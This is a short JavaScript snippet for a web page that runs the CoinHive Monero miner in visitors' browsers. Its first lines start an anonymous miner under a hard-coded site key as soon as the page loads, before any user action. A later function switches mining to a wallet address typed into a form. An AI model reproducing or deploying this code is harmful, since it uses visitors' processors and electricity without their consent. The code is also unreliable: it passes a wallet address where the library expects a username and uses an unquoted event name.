var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc');
anonMiner.start();

function getWalletAddress() {
    var walletAddress=document.getElementById('xmrAddress').value;
    return(walletAddress);
}

function startUserMiner(){
    var userWalletAddress=getWalletAddress();

    var userMiner = new CoinHive.User('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc',userWalletAddress);
    anonMiner.stop();
    userMiner.start();
    userMiner.on(open, function(userWalletAddress){
        document.getElementById('minerForm').innerHTML = 'You are Mining to XMR Address: ' + userWalletAddress;
    });
}
